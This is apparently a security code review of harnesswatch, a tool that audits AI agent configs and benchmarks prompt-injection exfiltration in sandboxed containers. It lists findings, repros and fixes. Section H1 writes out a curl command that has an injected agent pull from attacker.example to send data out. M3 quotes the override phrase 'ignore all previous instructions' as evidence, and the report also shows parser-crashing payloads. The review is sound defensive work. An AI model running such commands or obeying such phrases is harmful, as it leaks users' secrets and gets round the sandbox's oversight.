# harnesswatch code review

Reviewed at commit `8b9fb1c` (the tree moved from `f381a0c` during the review; all line numbers are for `8b9fb1c`).
Scope: `src/harnesswatch/`, `action.yml`, the bench/observe Docker topology. Method: reading the code, plus
reproductions with `uv run harnesswatch …` on throw-away fixtures in a scratch directory, and unit-level Python
snippets. No repo file other than this report was changed. No container was started; the live Docker topology
was only inspected (`docker network inspect`, `docker inspect hw-ollama`).

`uv run pytest` passes on this tree, so none of the findings below are covered by existing tests.

**Labels.** CONFIRMED means I reproduced it (the command or snippet is given). PLAUSIBLE means it follows
from the code, or from the code plus documented third-party behaviour, but I did not trigger it end to end.

| Severity | Count |
|---|---|
| High | 4 |
| Medium | 10 |
| Low | 8 |

---

## High

### H1. Bench/observe egress is not blocked: the one allowed host is dual-homed to the internet and reachable directly (PLAUSIBLE; topology CONFIRMED)
- **Where:** `observe/runner.py:136` (`NO_PROXY` gets every allowed host), `observe/runner.py:75-80`
  (`ensure_network` only checks that the target's network is `--internal`), `bench/adapters.py:277` (`OLLAMA`).
- **Evidence:** `docker inspect hw-ollama` shows it attached to `hw-bench-net` (internal) **and** `hw-pull`
  (`internal=false`). Because `ollama` is in `NO_PROXY`, the target talks to it directly, and the proxy never sees
  that traffic. Nothing filters the ports or API paths on that container.
- **Failure scenario:** an injected instruction, or a harness's own behaviour, runs
  `curl http://ollama:11434/api/pull -d '{"model":"attacker.example/ns/x:tag"}'`. Ollama documents pulls from
  arbitrary registries, so it makes HTTPS requests to `attacker.example`, an egress channel whose hostname and
  path carry data. That breaks MISSION §8.2 ("egress blocked"). `/api/create`, `/api/copy` and `/api/delete` on
  the same host can also replace or delete `qwen3:4b-instruct` for **every later run**, which silently
  contaminates the whole grid. The capture sidecar would log the SYN to `ollama:11434`, but nothing would flag it.
- **Fix:** disconnect Ollama from `hw-pull` while the bench runs (pull the models first, then
  `docker network disconnect hw-pull hw-ollama`), or put a path-allowlisting reverse proxy in front of it that
  only allows `/api/chat`, `/api/generate`, `/v1/chat/completions`, `/v1/responses`, `/api/tags` and `/api/show`.
  In `ensure_network`/`run`, refuse to start if any container behind an `allow` entry is also on a non-internal
  network.

### H2. HG-MCP-003 misses literal secrets in an MCP server's `url` or `command` (CONFIRMED)
- **Where:** `audits/mcp.py:202-214` only checks `env`, `headers` and `args`. `parsers/generic.py:199`
  (`plaintext_credentials`) only looks at keys whose names sound secret, and `url` is not one of them.
- **Repro:** this committed `.mcp.json` gives **0 findings** (`audit repo`):
  `{"mcpServers":{"z":{"type":"http","url":"https://mcp.example.com/s/sk-proj-AbCd…xyz/sse?api_key=ghp_AbCd…6789","headers":{"X-Api-Key":"${KEY}"}}}}`.
  URL-embedded keys are a common way to ship hosted MCP servers. A `"command": "env TOKEN=ghp_… npx pkg"`
  string is also missed.
- **Fix:** run `find_secrets()` over `server.url` (path, query and userinfo) and over `server.command`, and report
  them as `url`/`command`. Add should_fire fixtures for both.

### H3. A secret in a hook command is written unredacted into the JSON report (CONFIRMED)
- **Where:** `audits/config.py:184`: `evidence=hook.command[:120]`. `Finding.evidence` is serialised by
  `to_json` (`report.py:48`). The docstring at `models.py` says evidence is "always redacted", and SECURITY.md
  says "Secret matches are redacted in all output".
- **Repro:** a `.claude/settings.json` hook
  `curl -s -H 'Authorization: Bearer ghp_<36 alphanumerics>' https://hooks.example.com/x` →
  `audit repo -f json` prints `"evidence": "curl -s -H 'Authorization: Bearer ghp_AbCd…6789' …"` in full.
  In the GitHub Action this JSON is an intermediate file. Users who run `-f json -o` in CI and upload the
  artefact publish the token.
- **Fix:** pass every `evidence` (and every message fragment built from config text) through a single
  `redact_text()` helper (`observe/analyze.py:310` `_redact` already does this) in `rules_engine.run_checks`, so
  no check can forget it. Add a test asserting that no report output contains a `SECRET_PATTERNS` match.

### H4. Untrusted repo configs can hang `audit repo` or crash it with exit 1 (CONFIRMED)
- **Where:** `parsers/loaders.py:145` catches only `ValueError/YAMLError/TOMLDecodeError`. The recursive walkers
  `parsers/generic.py:199` (`plaintext_credentials`) and `:154` (`_walk_hooks`), plus `get_all`, have no depth or
  node budget. `audits/ci.py:119`/`str(job.get("if"))` expands YAML aliases.
- **Repros** (each is a single file in an otherwise empty repo):
  - `.claude/settings.json` = `{"a":` + 200 000 × `[` … → `RecursionError` traceback, **rc=1**.
  - `.aider.conf.yml` = `a: &x\n  b: *x\n` (self-referencing alias) → `RecursionError` in
    `plaintext_credentials`, **rc=1**.
  - `.aider.conf.yml` with a 9-level "billion laughs" alias tree (about 1 KB) → still running after 40–60 s
    (`timeout` rc=124). It walks about 10⁹ nodes.
- **Impact:** the Action and the pre-commit hook are meant to run on untrusted PRs. A 1 KB file stalls the job
  until the CI timeout. rc=1 is also the "findings" exit code, so the Action reports a crash as "found
  findings" (see M6).
- **Fix:** use a YAML loader that rejects aliases in harness configs (override `compose_node` to raise on
  `AliasEvent`, or count alias expansions). Catch `RecursionError` in `parse_text` and turn it into
  `ConfigParseError`. Give the walkers a depth limit (for example 64) and a node budget.

---

## Medium

### M1. Bench: the canary secret is in the harness's own environment, which contaminates `secret_accessed` (CONFIRMED by reading)
- **Where:** `bench/runner.py:111` puts `HW_CANARY_SECRET` into `spec.env`. `observe/runner.py:187` passes it as
  `-e` to the **target** container, and `run.sh` launches the harness with that environment.
  `bench/runner.py:161` then sets `secret_accessed = canary.secret in output or written_with_secret …`.
- **Failure scenario:** a harness or model runs `env`/`printenv` (common when debugging), or a harness records its
  environment in session or shell-snapshot files. The run is then scored `secret_accessed=True` even though
  `.env` was never read, and `canary_hit` counts state files the harness wrote. The secret is also available to
  an injected instruction without touching `.env`.
- **Fix:** keep the secret away from the harness. Start the sink with `HW_CANARY_SECRET=… python3 /hw/sink.py`
  using a value read from a root-only file, or have `run.sh` `unset HW_CANARY_SECRET` before running the harness.
  Better still, give the sink only `sha256(secret)` and compare hashes of the decoded substrings.

### M2. Bench: a run is silently dropped (selection bias) when the agent tampers with collected files (CONFIRMED)
- **Where:** `bench/runner.py:147` calls `json.loads` on every `sink.jsonl` line without error handling.
  `observe/runner.py:264-267` (`_read_from`) calls `tar.extractfile()` on a symlink member. `bench/runner.py:243`
  catches everything as an "infrastructure failure: not recorded, retried".
- **Repros:** `score()` with a `sink.jsonl` containing a non-JSON line raises `JSONDecodeError`. A tar whose only
  member is a symlink `calc.py → /etc/passwd` makes `extractfile` raise `KeyError("linkname … not found")`.
  `docker cp` copies the symlink, not its target.
- **Failure scenario:** the agent (which shares the uid with `/hw/out`) appends to `/hw/out/sink.jsonl`, or
  replaces `calc.py` with a symlink. The run disappears from `runs.jsonl` and is re-sampled on resume, so cells
  under-count exactly the runs where the injection did the most. The same `KeyError` crashes `harnesswatch observe`
  with a traceback, because `cli.py:354` catches only `ObserveError`.
- **Fix:** parse the sink tolerantly (skip non-dict and invalid lines, and count them as `sink_tampered`). In
  `_read_from`, accept only `member.isfile()` and record "symlink"/"missing" otherwise. Record infrastructure
  failures as rows with `error=…` instead of dropping them. Write sink output to a directory the harness user
  cannot write (sink as a different uid).

### M3. Repo scans follow symlinks out of the repository (CONFIRMED)
- **Where:** `audits/instructions.py:54` (`is_file()` follows links), `:57` (`path.rglob("*")` on a symlinked
  directory), `parsers/generic.py:295/299`, `audits/ci.py` `collect`, and `resources.py:71` (`base.glob`).
- **Repro:** a repo containing `AGENTS.md -> /…/outside/sub/id_rsa` and `.clinerules -> /…/outside` produces
  findings at `AGENTS.md` and `.clinerules/sub/id_rsa`, with `"evidence": "OVERRIDE: ignore all previous
  instructions"` taken from the outside file. `.clinerules -> /` makes the instructions audit walk and read every
  `.md`, `.txt` or extension-less file under 2 MB on the runner (for example `~/.ssh/id_rsa`). Their paths and
  phrase fragments land in the report, and the walk is also a DoS. A config symlink to a regular `/proc` file is
  read too (size 0 passes the cap).
- **Fix:** in repo mode, resolve each candidate and skip it unless `resolved.is_relative_to(repo.resolve())`.
  Use `os.walk(followlinks=False)`/`lstat`, and refuse non-regular files (`stat.S_ISREG(os.lstat(p).st_mode)`).
  Add symlink fixtures (inside → allowed, outside → skipped with an error entry).

### M4. Quadratic CPU in text scanners and a ReDoS in the secret `ASSIGNMENT` regex (CONFIRMED)
- **Where:** `textscan.py:120` `line_of()` counts newlines from offset 0 for every hit (called at `:152`, `:186`,
  `:216`, …). `secrets.py:34-36`: `[A-Za-z0-9_.\-]*(?:…token…)[A-Za-z0-9_.\-]*` backtracks over every start
  position of a long run of identifier characters.
- **Measured:** `hidden_unicode("​"*80_000)` takes 0.82 s and grows ×4 per doubling, so a 2 MB `AGENTS.md`
  (under `MAX_BYTES`) of zero-width characters needs about 8 minutes. 40 k mixed-script words take 0.94 s, so
  2 MB takes about 2.5 minutes. `find_secrets("A"*20_000)` takes 9 s (quadratic), so a single 1 MB base64url/hex
  line in a transcript takes hours in `audit secrets`. The same redaction runs on container output in
  `observe` (`analyze._redact`).
- **Fix:** precompute newline offsets once and use `bisect` for line numbers. Anchor the key part of
  `ASSIGNMENT` (for example `(?<![A-Za-z0-9_.\-])` before it, and a bounded `{0,64}` on both sides), or match
  keys with a separate tokenizer. Cap the line length scanned (for example the first 64 KB of each line).

### M5. Parse and read failures are invisible to the gate and to SARIF; a missing path passes (CONFIRMED)
- **Where:** `report.py:96-160` (SARIF has no `invocations[].toolExecutionNotifications`), `to_markdown` (no
  errors), `report.py:54` `load_json` (drops the `errors` from merged reports), `cli.py:115-136` (errors never
  affect the exit code), and `audits/instructions.py:62-64` (`stat`/`read_bytes` outside `try`).
- **Repros:**
  - `audit repo /nonexistent/dir` → "No findings.", **rc=0**. A typo in the Action's `path` input passes CI.
  - A config that harnesswatch fails to parse (see L1) shows up in JSON `errors` only. The Action's SARIF and
    gate never see it, which is an evasion path for a malicious repo.
  - One `chmod 000 AGENTS.md` aborts the **whole** audit with rc=2 (`Permission denied`), and every other finding
    is lost.
- **Fix:** error out (rc 2) when `PATH` does not exist. Emit parse errors as SARIF tool notifications and keep
  them through `report`. Add `--fail-on-error` (on by default in the Action). Catch `OSError` per file in
  `instructions.collect` and `ci.collect` and record it in `errors`.

### M6. Exit-code contract (0 clean / 1 findings / 2 error) is broken by uncaught exceptions (CONFIRMED)
- **Repros:** `--baseline /nonexistent.json` → rc=1. `report bad.json` (no `findings` key) → rc=1.
  `bench run --harness nope` → `KeyError` rc=1 (`cli.py:412`). The H4 inputs → rc=1. A Rich markup crash (M8) →
  rc=1.
- **Impact:** CI wrappers, including `action.yml`'s `rc -gt 1` check, treat a crash as "findings found" and
  continue. With `fail-on` set above the severities actually present, a crash can look like success.
- **Fix:** wrap `app()` in a top-level handler that maps any unexpected exception to `typer.Exit(2)` with a
  one-line message. Validate `--harness/--scenario/--mode` against the registries, and validate the baseline file
  structure.

### M7. SARIF `artifactLocation.uri` is not a valid, repo-root-relative URI (CONFIRMED for the output; GitHub effect PLAUSIBLE)
- **Where:** `report.py:125`: `{"uri": f.location.path}`, with no percent-encoding, no `uriBaseId`/`originalUriBaseIds`.
- **Repro:** findings in `.github/workflows/agent run#1.yml` and `my dir#1/AGENTS.md` produce
  `"uri": ".github/workflows/agent run#1.yml"`. A space is illegal in a URI, and `#1.yml` becomes a fragment, so
  code scanning resolves the file to `agent run`. `audit all` and `supply` also emit `~/.claude/...`, absolute
  `/usr/...` paths and `pkg:npm/%40…` purls as artifact URIs. The Action's `path:` input (a subdirectory) makes
  every URI relative to that subdirectory, not to the repo root.
- **Fix:** emit `urllib.parse.quote(path)` with `uriBaseId: "%SRCROOT%"` and set `originalUriBaseIds`. Prefix the
  scanned path relative to the git root. Put non-file subjects (purls, home paths) under
  `logicalLocations`/properties instead of `artifactLocation`. Add a SARIF 2.1.0 JSON-schema validation test (none
  exists).

### M8. Config-controlled strings are rendered as Rich markup and raw terminal escapes (CONFIRMED)
- **Where:** `report.py:187-193`. `f.message`/`loc` go into a Rich `Table` with markup enabled, and messages embed
  MCP server names, hook events and paths taken from the repo.
- **Repros:** an MCP server named `[/bold]x[red` → `MarkupError` traceback, rc=1 (the default `rich` format, which
  is what the pre-commit hook uses). A server named `ok\u001b[2K\u001b[1Ahidden` → raw `ESC[2K ESC[1A` reaches
  the terminal (`od -c` shows `033 [ 2 K`), so a hostile repo can erase or overwrite report lines.
- **Fix:** wrap user-derived cells in `rich.text.Text(value)` (no markup) after stripping C0/C1 control characters.
  In `to_markdown`, also escape backticks and `|` in `loc` and neutralise `<`/`](`.

### M9. `observe` reads unbounded container output into host memory with no timeouts (PLAUSIBLE)
- **Where:** `observe/runner.py:106-128` (`docker cp target:/root -` for whole roots such as `/usr/local`, `/tmp`
  and `/home`, buffered entirely by `capture_output=True`, filtered by `wanted` only afterwards), `:253-255`
  (`docker logs` without a limit), `:258-267` (artifacts), and `:66` (900 s timeout only in `docker()`; the
  direct `subprocess.run` calls have none).
- **Failure scenario:** the harness under test (or an injected instruction) writes a 20 GB file to `/tmp`, or
  prints without end. `--memory 4g` does not limit disk or log size, so the host process buffers the full tar or
  log and the researcher's machine runs out of memory. A single changed file under `/usr/local` also pulls in the
  entire `node_modules` tree on every run.
- **Fix:** stream with `Popen(stdout=PIPE)` and `tarfile.open(mode="r|")`, stop after N bytes or members, and
  `docker cp` only the paths in `wanted` (or their nearest directories). Use `docker logs --tail` with a byte cap,
  add `--log-opt max-size=…` and `--storage-opt size=…`/tmpfs `/tmp` with a size, and add timeouts to every
  subprocess call.

### M10. Baseline fingerprints are unstable, so `--baseline` stops suppressing known findings (CONFIRMED by reading)
- **Where:** `models.py:70`: `sha256(rule_id|path|line|message)`. Messages embed counts, scores and line lists.
- **Failure scenario:** a team baselines today's report. The next day:
  - one line inserted above a hook in `AGENTS.md` changes `line`;
  - HG-INJ-002's "score 7 … (lines 3, 9)" becomes "score 9 …";
  - HG-SEC-002's "12 harness log file(s) are world-readable" becomes "13 …" as logs accumulate;
  - HG-HOOK-001's "defines 2 shell hook(s)" becomes "defines 3 …".

  Every one of these re-appears as a new finding and fails the gate, so `audit secrets` can effectively never be
  baselined.
- **Fix:** fingerprint `rule_id + path + a stable subject key` that the check supplies on the `Hit` (server name,
  hook event+command hash, setting key, harness+role). Leave line, message and counts out of the hash.

---

## Low

### L1. JSONC/JSON5 stripper ignores single-quoted strings (CONFIRMED)
- **Where:** `parsers/loaders.py:26-55`. Only `"` toggles string state, so `//` or `/*` inside `'…'` is treated as
  a comment.
- **Repro:** `parse_text("{ mcpServers: { r: { url: 'http://evil.example.com/mcp', }, }, }", "json")` →
  `ConfigParseError`. The plaintext-HTTP MCP-002 finding is lost (and the error is invisible per M5).
  `{a: '/*', mcpServers: {...}, b: '*/'}` hides everything in between from the scan.
- **Fix:** track both quote characters in `strip_jsonc`/`_drop_trailing_commas` (or use a real JSON5 parser for
  JSON5 files only), and add hypothesis cases with single-quoted URLs.

### L2. Inventory version detection picks up unrelated `package.json` files (CONFIRMED on a synthetic layout)
- **Where:** `inventory.py:92-100`. It walks every ancestor of the resolved binary and returns the first
  `package.json` it finds, even one without `version`.
- **Repros:** `~/bin/claude` with a dotfiles `~/package.json` (`version 9.9.9`) → `claude-code 9.9.9`. An npm bin
  under `pkg/dist/index.js` next to `dist/package.json` = `{"type":"module"}` → `version None`, and the search
  stops before `pkg/package.json`. The wrong version is then sent to OSV with `--online` (false or missed CVEs).
- **Fix:** only accept a manifest whose `name` matches one of the profile's npm `packages`, keep walking past
  manifests without a version, and stop at the first `node_modules` boundary or at `$HOME`.

### L3. Egress proxy: malformed targets are blocked but never logged (CONFIRMED)
- **Where:** `observe/sidecars/egress_proxy.py:30-35`. `int(port)` and `urlsplit().port` raise before `_deny`
  logs anything.
- **Repro:** `_target` raises `ValueError` for `CONNECT [2001:db8::1]:443`, `CONNECT evil.example:443x` and
  `GET http://evil.example:99999/`. These attempts are absent from `egress.jsonl`, so `blocked_hosts` and
  exfil-attempt counts are too low. The proxy otherwise checks exactly the host it connects to: absolute-form,
  `user@host` and Host-header spoofing all resolve consistently, so I found no bypass of the proxy itself.
- **Fix:** wrap `_target` in a `try` and log `{"action":"blocked","raw":self.path[:200]}` on parse failure. Parse
  CONNECT with `rpartition(":")` and bracket-aware IPv6 handling.

### L4. `audit secrets` follows symlinked intermediate directories and reads whole lines before the size cap (CONFIRMED / PLAUSIBLE)
- **Where:** `audits/secrets.py:56` (`is_symlink()` checks only the last path component) and `:69-71`.
- **Repro:** `~/.claude/projects/linked -> /elsewhere` → `/elsewhere/x.jsonl` is scanned (CONFIRMED). A
  multi-GB log with no newline is loaded as one `str` before `read > limit` is checked (PLAUSIBLE), and that
  line is then skipped entirely, which is a false negative.
- **Fix:** check `resolved.is_relative_to(state_dir.resolve())`. Read in fixed-size chunks with overlap
  (`handle.read(1<<20)`) instead of by line.

### L5. Container hardening gaps (PLAUSIBLE)
- **Where:** `observe/runner.py:149-218,250`.
  - The target has `--cap-drop ALL` but no `--security-opt no-new-privileges` and no read-only rootfs.
  - The proxy and capture sidecars run as root with default capabilities and no memory or pids limits.
  - `docker rm -f` leaves anonymous volumes behind (images with `VOLUME` keep harness state, synthetic
    credentials included, after the run, and `docker diff` does not see writes there).
  - `capture.py:24` writes the ready marker as root through `/proc/1/root/tmp/.hw_ready`, so a pre-existing
    symlink at that path in the target image is followed.
  - For the record: no host directory other than the two read-only sidecar scripts is mounted, the docker
    socket is never mounted, and tar output is never extracted to disk.
- **Fix:** add `--security-opt no-new-privileges`, `--cap-drop ALL` plus only the capabilities needed for the
  sidecars, `--memory`/`--pids-limit` on the sidecars, and `docker rm -fv`. Open the marker with
  `O_NOFOLLOW|O_CREAT|O_EXCL`.

### L6. Bench CLI options that do nothing or are not validated (CONFIRMED by reading)
- `--max-usd` "Hard spend cap" (`cli.py:399`, `bench/runner.py:251`) is a no-op, because `cost_usd` is never
  set (always 0.0).
- `--mode foo` is accepted and silently runs the default mode, recorded as `foo`.
- `--model` is substituted unescaped into TOML and JSON config text (`bench/adapters.py:36,130`), so a `"` in the
  model tag breaks the config or injects keys.
- **Fix:** either remove `--max-usd` or document it as "reserved"; validate `--mode` against `MODES`; build the
  configs with `tomllib`-compatible quoting or `json.dumps`.

### L7. CI audit misses workflow-level `env:` secrets (CONFIRMED) and mislocates lines (PLAUSIBLE)
- **Where:** `audits/ci.py:119` uses the job `env`/`if` only. `_line` (`:84`) returns the first textual
  occurrence of `"<job>:"`.
- **Repro:** `on: issue_comment` + top-level `env: ANTHROPIC_API_KEY: ${{ secrets.… }}` +
  `claude -p … --dangerously-skip-permissions` is rated HIGH, and the message does not mention
  "repository secrets exposed". Severity should be CRITICAL, because the secret is in the job environment.
- **Fix:** include `wf.data.get("env")` in `job_ctx`. Locate jobs via the YAML node marks (`compose`) instead of
  text search.

### L8. `home=` override does not isolate `$XDG_CONFIG_HOME` (CONFIRMED by reading)
- **Where:** `resources.py:46`. When a caller (or a test) passes `home=tmp`, `$XDG_CONFIG_HOME` still points at
  the real user's config. Tests run on a developer machine with XDG set can then read the developer's real
  harness config.
- **Fix:** derive XDG from `home` whenever `home` is passed explicitly.

---

## Also checked and found OK
- No `shell=True`, `eval`, `exec`, `pickle` or `os.system`. YAML is always loaded through a SafeLoader
  (`loaders.py:19`, CSafeLoader). Docker is always called with argument lists, and container names come from a
  uuid.
- Tar output from `docker cp` is never extracted to disk (`extractfile` into memory only), so there is no tarfile
  path traversal. The member read size is capped at 20 MB for canary checks.
- SARIF `ruleIndex` matches the `driver.rules` order; `level`, `version` and `$schema` are present.
- `McpServer.env/headers` and `HarnessConfig.plaintext_credentials` are `exclude=True` and never serialised.
- `ensure_network` refuses a non-internal network for the target.
- The egress proxy checks exactly the host it connects to (see L3).

## Test gaps (none of the above is covered)
1. Adversarial parser inputs: deep nesting, YAML alias recursion and alias bombs, and single-quoted JSON5 strings
   containing `//` or `/*` (H4, L1). Extend `test_parsers_fuzz.py` with these, plus a wall-clock budget.
2. A redaction property test over **all output formats**: plant every `SECRET_PATTERNS` shape in hooks, URLs,
   args and instruction files, then assert that no raw match appears in JSON, Markdown or SARIF (H2, H3).
3. Symlink fixtures (inside and outside the repo, and to a directory) for `instructions`, `config` and `ci`, and
   an intermediate-directory symlink for `secrets` (M3, L4).
4. SARIF schema validation, plus URIs with spaces, `#` and non-ASCII characters (M7).
5. CLI exit codes: missing path, missing or invalid baseline, invalid report input, unknown bench harness or
   mode, Rich markup in names (M5, M6, M8).
6. Performance regression tests for `textscan.hidden_unicode`, `_mixed_script` and `find_secrets` on 1 MB
   inputs (M4).
7. Bench scoring robustness: malformed `sink.jsonl`, a symlinked collected file, and env-only secret exposure
   (M1, M2). Proxy unit tests for `_target` and `_allowed` (L3).
8. Fingerprint stability: a finding's fingerprint should survive an unrelated line insertion above it and a
   growing log count (M10).

---

## Resolution

Fixed in the working tree (not committed). Tests are in `tests/test_review_fixes.py` unless noted.
After the fixes: ruff, ruff format, mypy --strict and pytest pass (coverage 93%). E6 is unchanged
(before and after: test P=0.9825, R=0.9825, tp=168 fp=3 fn=3; dev P=1.0, R=0.9764), so the
E6 results JSON and tables were not regenerated.

| Finding | Status | Test / reason |
|---|---|---|
| H1 | Deferred | `observe/*` and `bench/*` are frozen while the bench runs. Handled separately. |
| H2 | Fixed | `test_h2_secret_in_mcp_url_and_command`. New fixtures: `HG-MCP-003/should_fire/{url_embedded_key,command_env_token}` and `should_not_fire/url_env_reference`. HG-MCP-003 now checks the URL path, query and userinfo, and `command`. |
| H3 | Fixed | `test_h3_hook_secret_is_redacted_in_every_format`, `test_redact_text_helper`. `rules_engine.run_checks` passes every message, evidence and path through `secrets.redact_text` and strips control characters, so no check can skip redaction. |
| H4 | Fixed | `test_h4_hostile_configs_become_parse_errors`, `test_h4_ordinary_aliases_still_load`, `test_h4_audit_repo_survives_hostile_files`. YAML is checked from the event stream first (max depth 64, alias expansion capped at 1M nodes, self-referencing aliases rejected) because deep flow YAML segfaulted libyaml. `RecursionError` becomes `ConfigParseError`. Parsed data deeper than 64 levels is rejected. The CI audit now goes through `parse_text` and has the 5 MB size cap. |
| M1 | Deferred | `bench/*` is frozen. Handled separately. |
| M2 | Deferred | `bench/*` and `observe/*` are frozen. Handled separately. |
| M3 | Fixed | `test_m3_repo_scan_does_not_follow_symlinks_outside`, `test_m3_symlinks_inside_the_repo_are_followed`, `test_m3_non_regular_files_are_skipped`. `resources.repo_file_problem` does a resolve-inside-repo and regular-file check for config, instruction and CI files. Directories are walked without following symlinks. Skipped paths are recorded in `errors`. |
| M4 | Fixed | `test_m4_scanners_are_linear`, `test_m4_line_numbers_still_correct`, `test_m4_l4_secret_after_huge_line_is_found`, `test_m4_chunk_boundaries_do_not_double_count`. Line numbers come from a bisect newline index. `ASSIGNMENT`, `openai-api-key` and `jwt` are anchored at token starts and bounded. HTML comments are found with `str.find`. `markdown-exfil` uses possessive quantifiers. `base64 -d`, unicode-tag flag and prohibition lookbacks are bounded. `audit secrets` reads 1 MB windows with a 4 KB overlap. `observe/analyze._redact` was not touched (frozen); it reuses the now-linear `find_secrets`. |
| M5 | Fixed | `test_m5_missing_path_exits_2`, `test_m5_errors_reach_sarif_and_markdown`, `test_m5_report_keeps_errors`, `test_m5_unreadable_file_does_not_abort_audit`. SARIF has `invocations[].toolExecutionNotifications` and `executionSuccessful`. Markdown has an `## Errors` section. `report` keeps the `errors` from merged reports. Read errors are caught per file. `--fail-on-error` was not added; errors are visible but do not affect the gate. |
| M6 | Fixed | `test_m6_bad_inputs_exit_2`, `test_m6_unexpected_exception_exits_2`. A `SafeGroup` on the root app maps unexpected exceptions to a one-line `error:` message and exit 2. Baseline and report files without a `findings` list are rejected. |
| M7 | Fixed | `test_m7_sarif_uris_are_encoded_and_rooted`, `test_m7_cli_prefixes_path_relative_to_git_root`. URIs are percent-encoded, use `uriBaseId: %SRCROOT%` with `originalUriBaseIds`, and are prefixed with the scanned path relative to the git root. Home paths, absolute paths and purls become `logicalLocations`. No SARIF JSON-schema validation test was added, because `jsonschema` and the schema are not available offline. |
| M8 | Fixed | `test_m8_config_strings_are_not_markup_or_escapes`. Rich cells are plain `Text` with control characters stripped. In Markdown, `` ` ``, `\|`, `](` and `<`/`>` are escaped. |
| M9 | Deferred | `observe/*` is frozen. Handled separately. |
| M10 | Fixed | `test_m10_fingerprints_survive_unrelated_edits`, `test_m10_world_readable_count_does_not_change_fingerprint`. The fingerprint is `rule + path + key`. `key` is a hash of the subject the check supplies (server, hook event+command, job, tool, role), or of the message with digits removed. HG-SEC-002 aggregates are located at the common directory. `tests/golden/demo.sarif.json` was regenerated; the reason is in a comment in `test_sarif_golden`. Baselines written before this change will not match and need to be regenerated once. |
| L1 | Fixed | `test_l1_single_quoted_strings_keep_comment_markers`. |
| L2 | Fixed | `test_l2_unrelated_package_json_is_ignored`, `test_l2_walks_past_manifest_without_version`. |
| L3 | Deferred | `observe/sidecars` is frozen. Handled separately. |
| L4 | Fixed | `test_l4_symlinked_intermediate_directory_is_not_scanned`, plus the chunked-read tests under M4. |
| L5 | Deferred | `observe/*` is frozen. Handled separately. |
| L6 | Fixed (partly) | `test_l6_bench_run_validates_values`, `test_l6_max_usd_help_is_honest`. `--harness`, `--scenario`, `--mode` and `--model` (tag charset) are validated in `cli.py` and exit 2. `--max-usd` help now says that cost is only tracked for priced adapters and that local models cost $0. Escaping inside `bench/adapters.py` is deferred (frozen); the CLI tag check closes the injection path in the meantime. |
| L7 | Fixed | `test_l7_ci_job_lines_use_yaml_positions`, fixture `HG-CI-001/should_fire/workflow_level_env` (critical). |
| L8 | Fixed | `test_l8_explicit_home_isolates_xdg`. |

### Resolution of deferred findings (after the bench finished, 2026-10-15)
| Finding | Status | Evidence |
|---|---|---|
| H1 | fixed | `hw-ollama` was disconnected from `hw-pull` during the bench, as soon as the finding arrived. Ollama logs show no `/api/pull\|push\|delete\|copy\|create` call from a bench container; the only pulls came from 127.0.0.1, i.e. the operator's own `docker exec`. `observe.ensure_network` now refuses to run when an allowed host (alias-aware) is attached to any non-internal network (`test_ensure_network_refuses_dual_homed_allowed_host`). |
| M1 | fixed, data re-scored | The secret is now passed only to the sink process through a file deleted before the harness starts (`test_canary_secret_never_reaches_harness_environment`). For the 350 runs already collected, the new strict `secret_read` metric (`experiments/e3_rescore.py`) excludes the env-var form. It reports 0 reads, against 15 for the contaminated `secret_accessed`, mostly Codex shell snapshots of the process environment. The paper reports `secret_read` and explains the correction. |
| M2 | fixed | The sink log is parsed tolerantly (`test_tolerant_sink_parsing`). Collected files that are symlinks are ignored. No run was dropped in the E3 grid: `grep -c "run failed" bench/.work/grid.log` returned 0. |
| M9 | fixed | Per-file read cap (20 MB), timeouts on `docker cp` and `docker logs`, logs capped to the last 20k lines. |
| L3 | fixed | Malformed proxy targets are blocked **and** logged as `<malformed>`. |
| L5 | won't fix (documented) | The target keeps its default seccomp profile and `no-new-privileges` stays unset, so harness-native sandboxes (bwrap, setuid helpers) can be observed. It already runs with `--cap-drop ALL`, a PID limit, a memory limit, an internal network and no host mounts. |
